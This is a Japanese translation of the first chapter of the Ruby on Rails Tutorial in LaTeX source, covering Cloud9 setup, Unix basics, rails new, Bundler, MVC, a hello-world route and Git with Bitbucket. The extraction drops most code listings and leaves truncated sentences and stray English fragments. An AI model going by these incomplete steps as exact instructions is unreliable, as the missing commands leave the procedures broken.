コンピュータシステムによっては、コマンドを実行した時にエラーが発生するかもしれません。しかし本チュートリアルでは、あらゆる場面を想定してエラー対策をもれなく記載するような\href{http://en.wikipedia.org/wiki/Sisyphus}{不毛な作業}は行っていません。そのような場合は、即座にエラーメッセージをGoogleで検索してください。エラーメッセージをGoogleで検索することは、実際のソフトウェア開発でも使われている基本的なテクニックなので、よい練習にもなります。
本チュートリアルのチュートリアルを進めていくうちに何か問題が生じたら、\href{http://www.railstutorial.org/#help}{Railsチュートリアルのヘルプ}{p1}に記載されているリソースをご覧ください。
\emph{Railsチュートリアル}ではRailsアプリケーションのテスティングも扱っているので、コードでどんなことをするとテストスイートが失敗 (赤色で表示)し、どうするとテストスイートがパス (緑色で表示) するかを実地で学べるようになっています。
また、以下の埋め込みRubyは
チュートリアルの各章の最後には演習問題を配置しました。必須ではありませんが、挑戦をおすすめします。
本編と演習問題を分けるために、その後のコードリストには原則として解答を付けていません。
演習の解答が少ない分、本編で解答を示すようにしています。
最後に、\emph{Ruby on Railsチュートリアル}で使用されている多くのサンプルコードをわかりやすく記述するために、2つの工夫を加えました。
1つは、コードの重要な部分にハイライトを追加したことです。
ハイライト行は通常、コードに追加された行を示しますが、その前に示したコードとの違いを強調していることもよくあります (常にというわけではありませんが)。
2つ目は、長いコードの途中を次のように垂直連続ドットで省略したことです。
has_secure_password
連続ドットは省略を表しているので、他のコードと一緒にコピーしないようご注意ください
<n><n>  % section introduction (end)<n><n>  \section{さっそく動かす} % (fold)<n>  \label{sec:up_and_running}<n><n>
Rubyをインストールし、Railsなどのサポートソフトウェアを一からすべてインストールする練習は、たとえベテランRails開発者にとっても、退屈な作業になることでしょう。
OSの違い、バージョンの違い、テキストエディタの設定の違い、IDEの違いなど、環境にばらつきがあると、さまざまな問題が複合して発生してしまいます。
クラウドIDEは普通のWebブラウザの中で実行できるため、プラットフォームが異なっても同じように扱えます。この特長は、(Windowsのような) Rails開発環境の構築が面倒なOSでは特に便利です。
多少苦労しても構わないのでローカルPC環境で\emph{Ruby on Railsチュートリアル}を学習したいとお考えの方には、\href{http://installrails.com/}{InstallRails.com}{p2}に従って環境を構築することをお勧めします。[NIWATAKO\_TIPS]
Windowsユーザーは、InstallRailsで推奨された手順に従った場合であっても、Railsインストーラが古いという警告が表示される可能性があります。また、最新のチュートリアルとの互換性が保たれない可能性もあります。
開発環境は、Railsプログラマ一人ひとりすべて異なります。開発者は慣れてくるに従い、自分の環境を徹底的にカスタマイズするものだからです。開発環境を大別すると、テキストエディタやコマンドラインを使う環境と、IDE (統合開発環境) の2つに分けられます。
そして\emph{Ruby on Railsチュートリアル}では、複雑さを避けるために\href{http://c9.io/}{Cloud9}という素晴らしいクラウドIDEサービスを使って進めていきます。
特に今回の第3版では、Cloud9と提携して読者の皆様にチュートリアル用に最適化された開発環境を提供できたことを心から嬉しく思っています。
このようにして構築したRailsチュートリアル用Cloud9ワークスペースには、Ruby、RubyGems、Gitなど、プロ級のRails開発環境に必要なソフトウェアがすべて組み込まれています。
Railsだけはインストールされていませんが、これはもちろんチュートリアルのために意図的にそうしてあります (\ref{sec:installing_rails})。
このクラウドIDEには他にも、Web開発に必要な三種の神器であるテキストエディタ、ファイルブラウザ、コマンドラインターミナル (図\ref{fig:ide_anatomy}) もしっかり組み込んであります。
また、クラウドIDEのテキストエディタでは、Ruby on Railsの大きなプロジェクトには不可欠とも言うべきグローバルファイル検索も利用できます
たとえば、\kode{foo}という名前の関数定義を見つけるには、「def foo」をグローバル検索します。
最後にこのクラウドIDEですが、たとえ今後使うことがないとしても (筆者としても、他のエディタの使い方もぜひ知っておく必要があると考えています)、テキストエディタなどの開発ツールで一般にどんなことができるのかを知っておくには最適です。
クラウド開発環境を利用するための手順は次のとおりです。
[Go to your Dashboard] をクリックします。
[Create New orkspace] を選択します。
図\ref{fig:cloud9_new_workspace}に示したように、「rails-tutorial」(「rails\_tutorial」に\emph{しない}ようご注意ください) というワークスペース名を入力し、[Private to the people I invite] を選択し、Railsチュートリアルのアイコン (Ruby on Railsのアイコンでは\emph{ありません}) を設定します。
[Create] をクリックします。
Cloud9でのワークスペースの準備が完了したら、ワークスペースを選択して [Start editing] をクリックします。
Rubyの世界では、インデントに2つのスペースを使用するのがほぼ常識になっているので、このエディタのインデント設定もデフォルトの4から2に変えておくことをおすすめします。
インデント設定を変更するには、右上の歯車アイコンをクリックして [Code Editor (Ace)] を選択し、[Soft Tabs] 設定を開いて編集します (図 \ref{fig:cloud9_two_spaces})。
設定の変更はその場で反映されるので、[Save] ボタンをクリックする必要はありません。
Cloud9に新しいワークスペースを作成する。
Cloud9でインデントをスペース2つに設定する。
現時点のCloud9に含まれているRailsのバージョンは、最新のチュートリアルよりわずかに古く、互換性がありません。そのため、Railsを手動でインストールする必要があります。
なお、ローカルシステム上で開発する場合は普通のターミナルを使用します。クラウドIDEを使用している場合は、図\ref{fig:ide_anatomy}のコマンドラインエリアに入力します。
バージョンを指定してRailsをインストールする。
文字列
どんなRailsアプリケーションも最初の作成手順は基本的に同じです。\kode{rails new}コマンドを実行して作成します。
このコマンドを実行するだけで、指定のディレクトリにRailsアプリケーションのスケルトンを簡単に作成できます。
\ref{sec:development_environment}で推奨しているCloud9 IDEを\emph{利用しない}場合は、Railsプロジェクトで使用するための\kode{workspace}ディレクトリを作成しておいてください (リスト \ref{code:mkdir_rails_projects})。 directory for your Rails projects if it doesn’t already exist  and then change into the directory.
Railsプロジェクトで使用する\kode{workspace}ディレクトリを作成する(クラウドの場合は不要)。
$ mkdir workspace
$ cd workspace/
急いで学びたい人のためのUnixコマンドライン講座
WindowsユーザーやMac OS Xユーザーの多くはコマンドラインというものに馴染みがないことでしょう (Mac OS Xユーザーの方がほんのわずかコマンドラインを知っている人は多いかもしれませんが)。
幸い、今はおすすめのクラウド開発環境のおかげでUnixコマンドラインをみな同じように扱うことができ、\href{http://en.wikipedia.org/wiki/Shell_(computing)}{Bash}などの標準的な\href{http://en.wikipedia.org/wiki/Bash_(Unix_shell)}{シェルコマンドラインインターフェイス}を実行できます (訳注: 「シェル」とは、実際に動くコマンドやプログラムに「かぶさっている」インターフェイスと考えるとよいでしょう)。
コマンドラインの基本的な仕組みは本当にシンプルです。ユーザーはコマンドを発行 (issue) することで、実にさまざまな操作を実行できます。ディレクトリの作成なら\texttt{mkdir}コマンド、ファイルの移動やリネームは\texttt{mv}コマンド、ファイルのコピーなら\texttt{cp}コマンド、ファイルシステム内でのディレクトリの移動は\texttt{cd}コマンド、という具合です。
GUI (グラフィカルユーザーインターフェイス) しか使ったことのないユーザーからすると、コマンドラインの黒い画面は何やら恐ろしげでとっつきが悪いように見えるかもしれませんが、見た目ほど当てにならないものはありません。コマンドラインはそれ自体が強力なツールであり、エンジニアにとってなくてはならない道具箱なのです (訳注: 操作を誤ったときの被害もその分甚大ですが)。そうでなければ、どうしてエンジニアが揃いも揃ってコマンドラインを使うでしょうか。
経験豊富な開発者のデスクトップ画面を覗きこめば、十中八九どころか99%は、黒いターミナルウィンドウがいくつも開き、そこで多数のコマンドラインシェルが忙しく実行されているはずです。
コマンドラインについて話しだすときりがないので深入りはしませんが、本チュートリアルで必要なUnixコマンドラインのコマンドはほんのわずかしかありませんのでご安心ください (表\ref{table:unix_commands})。
Unixのコマンドラインについてもっとお知りになりたい方は、Mark Bates著『\href{http://conqueringthecommandline.com/}{\emph{Conquering the Command Line}}』をご覧ください。\href{http://conqueringthecommandline.com/book}{無料のオンライン版}や\href{http://conqueringthecommandline.com/#pricing}{電子書籍版、スクリーンキャスト}もあります。
ディレクトリ内容の表示
$ ls -l
ディレクトリの作成
mkdir <ディレクトリ名>
ディレクトリの移動
cd <ディレクトリ名>
上のディレクトリに移動
$ cd ..
ホームディレクトリに移動
ファイルの移動やリネーム
mv <移動元/現在の名前> <移動先/変更後の名前>
$ mv README.rdoc README.md
ファイルのコピー
cp <コピー元> <コピー先>
$ cp README.rdoc README.md
ファイルの削除
rm <ファイル名>
$ rm README.rdoc
空のディレクトリの削除
rmdir <ディレクトリ名>
$ rmdir workspace/
中身のあるディレクトリの削除
rm -rf <ディレクトリ名>
$ rm -rf tmp/
cat <ファイル名>
主要なUnixコマンド。
ローカルシステムまたはクラウドIDEで行う次の手順は、リスト\ref{code:rails_command}のコマンドを使用した最初のアプリケーションの作成です。
このようにバージョンを指定することで、リスト\ref{code:installing_rails}と同じバージョンのRailsで、最初のアプリケーションと同じファイル構造を作成することができます。
(リスト\ref{code:rails_command}を実行すると「Could not find ’railties'」というエラーが表示される場合は、インストールしたRailsのバージョンが正しくない可能性があります。リスト\ref{code:installing_rails}のとおりにコマンドを実行したかどうかを念のためダブルチェックしてください。
\kode{rails new}を実行する (バージョン番号を指定)。
      create  README.rdoc
      create  Rakefile
      create  config.ru
      create  .gitignore
      create  Gemfile
      create  app
      create  app/assets/javascripts/application.js
      create  app/assets/stylesheets/application.css
      create  app/controllers/application_controller.rb
<n>      .
         run  bundle install
Your bundle is complete!
Use `bundle show [gemname]` to see where a bundled gem is installed.
リスト\ref{code:rails_command}の下の方にご注目ください。\kode{rails new}を実行すると、ファイルの作成後に\kode{bundle install}コマンドが自動的に実行されています。
このbundle installコマンドの意味については\ref{sec:bundler}の最初で詳しくご説明します。
ご覧のとおり、\kode{rails}コマンドを実行すると大量のファイルとディレクトリが作成されます。
Webアプリケーションのディレクトリをどう構成するかは本来自由なのですが、RailsのようなWebフレームワークではディレクトリとファイルの構造 (図\ref{fig:directory_structure_rails}) はこのように標準化されています。そのおかげで、ディレクトリ構成に悩むことなく、実際に動作するアプリケーションを即座にゼロから作成できるのです。
ファイル/ディレクトリ構造がすべてのRailsアプリで標準化されているおかげで、他の開発者の書いたRailsのコードが読みやすくなります。これはWebフレームワークを導入する大きなメリットです。
Railsがデフォルトで作成するファイルについては表\ref{table:rails_directory_structure}を参照してください。これらのファイルやディレクトリの目的については本チュートリアル全体に渡って説明いたします。
特に、\ref{sec:the_asset_pipeline}以降ではRails 3.1の新機能である\kode{アセットパイプライン}の一部となる\emph{app/assets}ディレクトリについて詳しく説明します。アセットパイプラインによって、CSS (Cascading Style Sheet) やJavaScriptファイルなどのアセット (資産) を簡単に編成したりデプロイすることができます。
新規作成されたRailsアプリケーションのディレクトリ構造
モデル、ビュー、コントローラ、ヘルパーなどを含む主要なアプリケーションコード
アプリケーションで使用するCSS (Cascading Style Sheet)、JavaScriptファイル、画像などのアセット
バイナリ実行可能ファイル
アプリケーションの設定
データベース関連のファイル
doc/
マニュアルなど、アプリケーションのドキュメント
ライブラリモジュール
ライブラリで使用するCSS (Cascading Style Sheet)、JavaScriptファイル、画像などのアセット
アプリケーションのログファイル
エラーページなど、一般(Webブラウザなど)に直接公開するデータ
コード生成、コンソールの起動、ローカルのWebサーバの立ち上げなどに使用するRailsスクリプト
アプリケーションのテスト
一時ファイル
サードパーティのプラグインやgemなど
サードパーティのプラグインやgemで使用するCSS (Cascading Style Sheet)、JavaScriptファイル、画像などのアセット
アプリケーションの簡単な説明 (訳注: 近年は .rdocよりも .md ファイルの方がよく使われているようです)
\kode{rake}コマンドで使用可能なタスク
このアプリケーションに必要なGemの定義ファイル
アプリケーションのすべてのコピーが同じgemのバージョンを使用していることを確認するために使用されるgemのリスト
\href{http://rack.github.io/}{Rackミドルウェア}用の設定ファイル
Gitに取り込みたくないファイルを指定するためのパターン
デフォルトのRailsフォルダ構造まとめ。
Railsアプリケーションを新規作成したら、次は\emph{Bundler}を実行して、アプリケーションに必要なgemをインストールおよびインクルードします。
\ref{sec:the_hello_application}でも簡単に説明したように、Bundlerは\kode{rails}によって自動的に実行 (この場合は\kode{bundle install}) されます。ここではデフォルトのアプリケーションgemを変更してBundlerを再度実行してみます。
(クラウドIDEの場合は、ファイルナビゲーターで矢印をクリックしてサンプルアプリのディレクトリを開き、\kode{Gemfile}アイコンをダブルクリックします)。
Gemfileの内容は、だいたい図\ref{fig:cloud9_gemfile}やリスト\ref{code:default_gemfile}のようになります。バージョン番号など細かな点で多少の違いがあるかもしれません。
Gemfileの内容はRubyのコードですが、ここでは文法を気にする必要はありません。Rubyの詳細については第\ref{cha:rails_flavored_ruby}章で説明します。
ファイルやディレクトリが図\ref{fig:cloud9_gemfile}のように表示されない場合、ナビゲーターの歯車アイコンをクリックして [Refresh File Tree] を選択します
(一般に、ファイルやディレクトリがうまく表示されていない場合はこのようにファイルツリーを再表示してみてください)。
デフォルトの\kode{Gemfile}をテキストエディタで開く。
\kode{hello\_app}ディレクトリにあるデフォルトの\kode{Gemfile}。
# Bundle edge Rails instead:
# Use sqlite3 as the database for Active Record
# Use SCSS for stylesheets
# Use Uglifier as compressor for JavaScript assets
# Use CoffeeScript for .js.coffee assets and views
# See https://github.com/sstephenson/execjs#readme # for more supported runtimes
# gem 'therubyracer', platforms: :ruby
# Use jquery as the JavaScript library
# Turbolinks makes following links in your web application faster.
# Build JSON APIs with ease.
# Read more: https://github.com/rails/jbuilder
# bundle exec rake doc:rails generates the API under doc/api.
# Use ActiveModel has_secure_password
# gem 'unicorn'
# Use Capistrano for deployment
この時点では、デフォルト以外のgemをインストールする必要はありません。
\kode{gem}コマンドで特定のバージョン番号を指定しない限り、Bundlerは自動的に最新バージョンのgemを取得してインストールします。
たとえば、Gemfileに以下のような記述があるとします。
このsqlite3というgemのバージョンを指定する主な方法は2通りあります。これにより、Railsで使用されるgemのバージョンを「ある程度」制御できます。
1番目の方法は次のとおりです。
\kode{uglifier}のバージョンが\kode{1.3.0}以上であれば最新バージョンのgemがインストールされます。極端に言えば、バージョンが\kode{7.2}であってもそれが最新ならインストールされます (なお、uglifierはAsset Pipelineでファイル圧縮を行うためのものです)。
2番目の方法は次のとおりです。
このように指定すると、\kode{coffee-rails} (これもAsset Pipelineで使用するgemです) のバージョンが\kode{4.0.0}より大きく、\kode{4.1}\emph{より小さい}場合にインストールされます。
つまり、以下のコードを実行すると、
経験上、残念ながらマイナーアップグレードですら問題を引き起こすことがあります。このため、\emph{Railsチュートリアル}では基本的に事実上すべてのgemでバージョンを「ピンポイントで」指定しています。
これはリスト\ref{code:gemfile_sqlite_version}で使用されていました。
なお、この置換えのついでに、\texttt{sqlite3} gemをdevelopment環境とtest環境 (\ref{sec:rails_environments}) だけで使用する (つまりproduction環境では使用しない) ように変更している点にもご注目ください。これは、後でHerokuで使用するデータベースと競合する可能性を防ぐための処置です (\ref{sec:deploying})。
Gemfile
Ruby gemごとにバージョンを明示的に指定した\kode{Gemfile}。
表\ref{table:shortcuts}に示したように、実は\kode{install}を省略できます。\kode{bundle}コマンドそれ自体が\kode{bundle install}のエイリアスであるためです。
$ bundle install
Fetching source index for https://rubygems.org/
\kode{bundle install}コマンドの実行にはしばらく時間がかかるかもしれません。完了後、アプリケーションが実行可能になります。
\ref{sec:the_hello_application} の \kode{rails new}コマンドと\ref{sec:bundler},の\kode{bundle install}コマンドを実行したことにより、実際に動かすことのできるアプリケーションが作成されました。
ありがたいことに、Railsには開発マシンでのみブラウズできる\emph{ローカル}Webサーバーを起動するためのコマンドラインプログラム (\emph{スクリプト}) が付属しているので、以下のコマンドを実行するだけでRailsアプリケーションを簡単に起動することができます。
現在の環境に応じてアプリケーションを起動する正確なコマンドは次のとおりです。ローカルシステムの場合は、\kode{rails server}を実行するだけで済みます (リスト\ref{code:local_server})。Cloud9の場合は、\emph{IPバインディングアドレス}と\emph{\href{http://en.wikipedia.org/wiki/TCP_and_UDP_port}{ポート番号}}も指定する必要があります。(リスト\ref{code:cloud_server}){p6}。これらの値は、クラウドの外からRailsサーバーにアクセスするために使用されます
通常、Webサイトは80番ポートで受信待ちしますが、このポートを使用するには特別な権限が必要になることが多いので、一般的な慣習として、制限があまりない大きめのポート番号 (いわゆるハイナンバーポート) を使用します。
JavaScriptランタイムがインストールされていないというエラーが表示された場合は、\href{https://github.com/sstephenson/execjs}{GitHubのexecjsページ}にあるインストール可能なランタイムの一覧からJavaScriptランタイムを入手してください。
個人的には\href{http://nodejs.org/}{Node.js}がおすすめです)。
ローカルコンピュータでRailsサーバーを実行する。
$ cd ~/workspace/
=> Booting WEBrick
=> Ctrl-C to shutdown server
クラウドIDEでRailsサーバーを実行する。
どちらのオプションを使用する場合であっても、\kode{rails server}コマンドの実行は別のターミナルタブで行うことをおすすめします。こうしておけば最初のターミナルタブで他のコマンドを実行できるからです図\ref{fig:new_terminal_tab}と図\ref{fig:rails_server_new_tab}。
既に最初のタブでサーバーを開始している場合は、Ctrl+Cを押すとサーバーを終了できます。
Railsアプリケーションを表示するには、ローカルサーバーの場合は\href{http://localhost:3000/}{http://localhost:3000/}をブラウザで開きます。クラウドIDEの場合は、[Share] を開いて、開きたいアプリケーションのアドレスをクリックします (図\ref{fig:share_workspace})。
どちらの場合も、図\ref{fig:riding_rails}のようにブラウザにRailsアプリケーションが表示されます。
新しいターミナルタブを開く。
別のタブでRailsサーバーを実行する。
クラウドワークスペース上で実行しているローカルサーバーを共有する。
\kode{rails server}を実行したときのデフォルトのRailsページ。
最初のアプリケーションに関する情報を表示するには、画面の [About your application’s environment] リンクをクリックします。
図\ref{fig:riding_rails_environment}のように詳細な情報が表示されます (バージョン番号などは異なることもあります)。
もちろん、いずれデフォルトのRailsページは不要になりますが、アプリケーションが動いているのを見るのは気分のいいものです。
\ref{sec:hello_world}ではこのデフォルトページを削除し、カスタマイズしたホームページに置き換える予定です。
アプリケーション環境が表示されているデフォルトページ。
まだ始まったばかりですが、今のうちにRailsアプリケーションの全体的な仕組みを知っておくことは後々役立ちます (図\ref{fig:MVC})。
デフォルトのRailsアプリ構造 (図\ref{fig:directory_structure_rails}) を眺めてみると、\kode{app/}というディレクトリがあり、その中に「\kode{models}」「\kode{views}」「\kode{controllers}」という3つのサブディレクトリがあることに気付いた方もいると思います。
ここにはRailsが\href{http://en.wikipedia.org/wiki/Model-view-controller}{MVC (model-view-controller)} というアーキテクチャパターンを採用していることが暗に示されています。MVCでは、ドメインロジック (ビジネスロジックともいいます) と、グラフィカルユーザーインターフェイス (GUI) と密に関連する入力/表示ロジックを分離します。
Webアプリケーションの場合、「ドメインロジック」はユーザーや記事、商品などのデータモデルに相当し、ユーザーインターフェイスはWebページを指します。
Railsアプリと通信する際、ブラウザは一般的にWebサーバーに\emph{request} (リクエスト) を送信し、これはリクエストを処理する役割を担っているRailsの\emph{controller} (コントローラ) に渡されます。
コントローラは、場合によってはすぐに\emph{view} (ビュー) を生成してHTMLをブラウザに送り返します。
動的なサイトでは、一般にコントローラは (ユーザーなどの) サイトの要素を表しており、データベースとの通信を担当しているRubyのオブジェクトである\emph{model} (モデル) と対話します。
モデルを呼び出した後、コントローラは、ビューをレンダリングし、完成したWebページをHTMLとしてブラウザに返します。
A schematic representation of the model-view-controller (MVC) architecture.
今はまだこの解説が少し抽象的に思えるかもしれませんが、この章は後に何度も参照する事になるのでご安心ください。
\ref{sec:hello_world}ではMVCを使用するお試しアプリケーションをご覧に入れます。\ref{sec:mvc_in_action}では、このtoyアプリを使ってMVCの詳細を解説します。
Finally, the sample app will use all aspects of MVC; we’ll cover controllers and views starting in Section \ref{sec:static_pages}, models starting in Section \ref{sec:user_model}, and we’ll see all three working together in Section \ref{sec:a_users_resource}.
記念すべき最初のMVCフレームワークアプリケーションとして、先ほど作ったアプリに\href{http://en.wikipedia.org/wiki/Mr_Creosote}{ほんのちょっぴり}変更を加えることにしましょう。「Hello World」という文字列を表示するだけの\emph{コントローラのアクション}を追加します
(コントローラのアクションについては\ref{sec:mvc_in_action}で詳しく解説します)。
この改造が終わると、デフォルトのRailsページは図\ref{fig:riding_rails}のように「hello, world」ページが表示されます。これがこのセクションでの目標です。
名前から想像されるように、コントローラのアクションはコントローラ内で定義します。
ここでは、Applicationという名前のコントローラの中に\kode{hello}という名前のアクションを作成することにします。
実際、この時点ではコントローラはApplicationひとつしかありません。次のコマンドを実行すると、現在あるコントローラを確認できます。
新しいコントローラの作成は第\ref{cha:a_toy_app}章で行います。
リスト\ref{code:hello_action}に、\kode{hello}を定義したところを示します。ここでは\kode{render}関数で「hello, world!」というテキストを表示しています。
この時点ではRubyの文法については気にする必要はありません。第\ref{cha:rails_flavored_ruby}章で詳しく解説します。
Applicationコントローラに\kode{hello}を追加する。
# For APIs, you may want to use :null_session instead.
protect_from_forgery
表示したい文字列を返すアクションを定義したので、今度はデフォルトのページ (図\ref{fig:riding_rails_environment}) の代わりにこのアクションを使用するようRailsに指示します。
そのためには、Railsの\emph{ルーター (router)} を編集します。ルーターはコントローラとブラウザの間に配置され (図\ref{fig:MVC})、ブラウザからのリクエストをコントローラに振り分ける (=ルーティング) 役割を果たします
(図\ref{fig:MVC}では簡単のためルーターは省略していますが、\ref{sec:mvc_in_action}で詳しく解説します)。
ここではデフォルトのページを差し替えたいので、\emph{ルートのルーティング} (\emph{ルート URL}にアクセスした場合のルーティング) を変更することにします。
たとえばhttp://www.example.com/というURLの末尾は「/」になっているので、ルートURLは単に「/」(スラッシュ) と簡略表記することもあります (訳注: 本チュートリアルではrouteやroutingを「ルーティング」、rootを「ルート」と表記します)。
リスト\ref{code:default_root_route}に示したように、Railsのルーティングファイル (\kode{config/routes.rb}) には、ルートルーティングの構成方法がコメント行に示されています。
「welcome」はコントローラ名、「index」はコントローラ内のアクションです。
ルートルーティングを有効にするには、「\#」文字を削除してコメントを解除し、コードを書き換えます (リスト\ref{code:hello_root_route})。これにより、RailsのルートルーティングにアクセスするとApplicationコントローラの\kode{hello}アクションが動作します
(\ref{sec:conventions}でも説明したとおり、途中のドットだけの行は省略を意味しているので、その部分はそのままコピーしないでください)。
デフォルトのルートルーティング (コメントアウトされた状態)
# You can have the root of your site routed with "root"
# root 'welcome#index'
ルートルーティングを設定する。
リスト\ref{code:hello_action}のコードとリスト\ref{code:hello_root_route}のコードを使用すると、ルートルーティングから「hello, world!」が返されるようになります。
"hello world"
新しく動作するRailsアプリが完成したところで、さっそくアプリケーションのソースコードを\emph{バージョン管理}下に置きましょう。これを行わないとアプリケーションが動かないということではありませんが、ほとんどのRails開発者はバージョン管理を開発現場において必要不可欠なものであると考えています。
バージョン管理システムを導入しておけば、プロジェクトのコードの履歴を追ったり、うっかり削除してしまったファイルを復旧 (ロールバック) したりという作業が行えるようになります。
バージョン管理システムを熟知することは、今やあらゆるソフトウェア開発者にとって必須のスキルであると言ってよいでしょう。
バージョン管理システムにもさまざまなものがありますが、RailsコミュニティではLinuxカーネル用にLinus Torvaldsにより開発された分散バージョン管理システムである\href{http://git-scm.com/}{Git}が主流になっています。
ソースコードのバージョン管理は「\emph{何としても}」導入してください。バージョン管理はRailsを使用するどんな場面でも必要になりますし、バージョン管理システムを応用して、自分の作成したコードを他の開発者と簡単に共有したり (\ref{sec:bitbucket})、最初の章で作成したアプリケーションを本番サーバーへデプロイしたりすることもできる (\ref{sec:deploying}) からです。
<n><n>    \subsection{インストールとセットアップ}<n>    \label{sec:git_setup}<n><n>
推奨環境であるクラウドIDE (\ref{sec:development_environment}) にはデフォルトでGitが導入されていますので、追加で導入する必要はありません。
その他の場合は、\href{http://installrails.com/}{InstallRails.com} (\ref{sec:up_and_running}) の指示に従ってGitをシステムに導入してください。
初めてのシステムセットアップ
インストールしたGitを使用する前に、最初に1回だけ設定を行う必要があります。
これは\emph{system}セットアップと呼ばれ、使用するコンピュータ1台につき1回だけ行います。
このGit configurationで設定する名前やメールアドレスは、今後リポジトリ上で一般に公開されますのでご注意ください
(最初の2行の設定以外は必須ではありません。
3行目は、今後のGitリリースでの前方互換性のために使用されるオプション設定です。
4行目は、\kode{checkout}コマンドをもっと短い\kode{co}と入力できるようにするためのオプション設定です。
\kode{co}コマンドエイリアスを設定していなくても動作するように、本チュートリアルでは\kode{checkout}コマンドを使用するようにしていますが、著者は普段から\kode{git co}だけを常に使っています)
初めてのリポジトリセットアップ
今度は、\emph{リポジトリ} (\emph{repo}と略されることもあります) ごとに作成の必要な作業を行います。
まず、Railsアプリケーションのルートディレクトリに移動し、新しいリポジトリの初期化を行います。
次に\kode{git add -A}を実行し、プロジェクトのファイルをリポジトリに追加します。
このコマンドを実行すると、現在のディレクトリにあるファイルがすべて追加されます。ただし、\kode{.gitignore}に記載されているパターンにファイル名がマッチする場合、そのファイルは追加されません。
\kode{.gitignore}ファイルは、\kode{rails new}コマンドを実行すると自動的に生成され、Railsプロジェクト用のパターンも記入されます。もちろん、自分でパターンを追加してもかまいません
チュートリアル本編ではこのファイルを修正することはありませんが、\ref{sec:advanced_testing_setup}に\kode{.gitignore}ファイルへの追加例があります。これは、\ref{sec:advanced_testing_setup}で行うオプションの詳細テスト設定の一部です。
Gitにプロジェクトのファイルを追加すると、最初は\emph{ステージングエリア}という一種の待機用リポジトリに置かれ、コミットを待ちます。安全のため、いきなりコミットしないようになっているのです。
ステージングエリアの状態を知るには\kode{status}コマンドを使用します。
  Initial commit
.gitignore
Gemfile.lock
README.rdoc
Rakefile
（出力結果が長いので、省略された部分を示すために縦点を使っています。）
ステージングエリアで控えている変更を本格的にリポジトリに反映 (コミット) するには、\kode{commit}コマンドを使います。
[master (root-commit) df0a62f] Initialize repository
\kode{-m}フラグを使用すると、コミットメッセージをコマンドラインで直接指定できます。\kode{-m}フラグを使用しない場合はシステムのデフォルトのエディタが開き、そこでコミットメッセージを入力します
(本チュートリアルでは常に\kode{-m}フラグを使用するようにしています)。
ここでコミットについて少し解説しておきます。Gitにおけるコミットは、あくまで\emph{ローカル}マシン上での操作であることに注意してください。
\kode{git push}コマンドで変更をリモートリポジトリにプッシュする方法については\ref{sec:git_commands}で解説します。
ちなみに、\kode{log}コマンドでコミットメッセージの履歴を参照できます。
commit df0a62f3f091e53ffa799309b3e32c27b0b38eb4
Author: Michael Hartl <michael@michaelhartl.com>
ログがある程度以上長い場合は、\kode{q}キーを押して終了します。
今の時点では、ソースコードをバージョン管理下に置かなければならない理由が今ひとつよくわからないという方がいるかもしれませんので、例を1つご紹介します。
えっ?!
application_controller.rb
ls: app/controllers/: No such file or directory
\kode{-rf}フラグは、「recursive」(サブディレクトリやその中のファイルもすべて削除する) と「force」(削除して良いかどうかをユーザーに確認しない) を指定するオプションです。
現在の状態を確認してみましょう。
no changes added to commit (use "git add" and/or "git commit -a")
ファイルがいくつか削除されましたが、この変更が行われたのは現在の「作業ツリー」内のみなので、まだコミット (保存) されていません。
つまり、以前のコミットを\kode{checkout}コマンド (と、現在までの変更を強制的に上書きして元に戻すための\kode{-f}フラグ) でチェックアウトすれば、簡単に削除前の状態に戻すことができます。
nothing to commit (working directory clean)
削除されたディレクトリとファイルを無事復旧dました。
これでひと安心です。
Gitを使用してプロジェクトをバージョン管理下に置くことができたので、今度は\href{http://www.bitbucket.com}{Bitbucket}にソースコードをアップロードしてみましょう。BitbucketはGitリポジトリのホスティングと共有に特化したサイトです
リポジトリをBitbucketにわざわざプッシュするのには2つの理由があります。１つ目は、ソースコード (とそのすべての変更履歴) の完全なバックアップを作成することです。２つ目は、他の開発者との共同作業をより簡単に行うことです。
GitHubとBitbucket
GitHubとBitbucketは、現時点でのGitリポジトリの2大人気サイトです。
両者のサービスは非常に似通っています。どちらも、Gitリポジトリのホスティングと共同作業を行うことができ、リポジトリの表示や検索を行いやすくしてくれます。
本チュートリアルでリポジトリを採用するうえで重要な両者の違いは、GitHubは「リポジトリを一般公開する場合は無料、公開しない場合は有料」なのに対し、Bitbucketは「共同作業者が一定数以下ならリポジトリを公開しなくても無料、共同作業者が一定数を超えると有料」である点です。なお、どちらも容量制限はありません。The important differences (from the perspective of this tutorial) are that GitHub offers unlimited free repositories (with collaboration) for open-source repositories while charging for private repos, whereas Bitbucket allows unlimited free private repos while charging for more than a certain number of collaborators.
もちろん読者の皆様は、目的に応じてどちらのサービスを選んでもかまいません。
本チュートリアルの前のエディションでは、オープンソースコードのサポートを強調するGitHubを採用していました。しかしチュートリアルの目的には、Webアプリケーションの\emph{全}リポジトリがデフォルトで非公開になっている方がセキュリティ上好都合です。
Webアプリケーションのリポジトリには、暗号化キーやパスワードなどの機密情報が含まれる可能性があります。このような情報を利用されると、サイトのコード実行のセキュリティがおびやかされるかもしれません。
もちろん、.gitignoreなどを適切に利用すれば、そうした機密情報を適切に扱うことができます。しかしそのためにはそれなりの経験が必要であり、慣れた開発者でもときに扱いを間違えてしまうことがありえるのです。
本チュートリアルで作成したサンプルWebアプリケーションそれ自体は公開してもまったく問題はありませんが、上の理由により、一般公開されているリポジトリに置くことには若干のリスクが生じます。
そういうわけで、リモートリポジトリはデフォルトで非公開であるのが望ましく、なるべく安全側に倒しておきたいと考えます。
GitHubはリポジトリを一般公開しない場合は有料ですが、Bitbucketはリポジトリを一般公開しなくても容量無制限かつ無料で利用できます。チュートリアルのためにはGitHubよりもBitbucketの方が好都合であると言えます。
Bitbucketの利用開始は簡単です。
Bitbucketアカウントがない場合は\href{https://bitbucket.org/account/signup/}{アカウントを作成します}。
\href{https://en.wikipedia.org/wiki/Public-key_cryptography}{\emph{公開鍵}}をクリップボードにコピーします。
リスト\ref{code:cat_public_key}に示したように、クラウドIDEを使用していれば\kode{cat}コマンドで公開鍵を表示できるので、それを選択、コピーします。
クラウドIDEを使用しておらず、リスト\ref{code:cat_public_key}のコマンドを実行しても何も表示されない場合は、\href{https://confluence.atlassian.com/x/YwV9E}{Bitbucketアカウントに公開鍵をインストールする方法} (英語) を参照してください。
Bitbucketに公開鍵を追加するには、右上にあるアバター画像をクリックして [Manage account]、[SSH keys] の順に選択します (図\ref{fig:add_public_key})。
\kode{cat}コマンドで公開鍵を出力する。
$ cat ~/.ssh/id_rsa.pub
SSH公開鍵を追加する。
公開鍵の追加が終わったら、[Create] をクリックして\href{https://bitbucket.org/repo/create}{新しいリポジトリを作成}します 図\ref{fig:create_first_repository})。
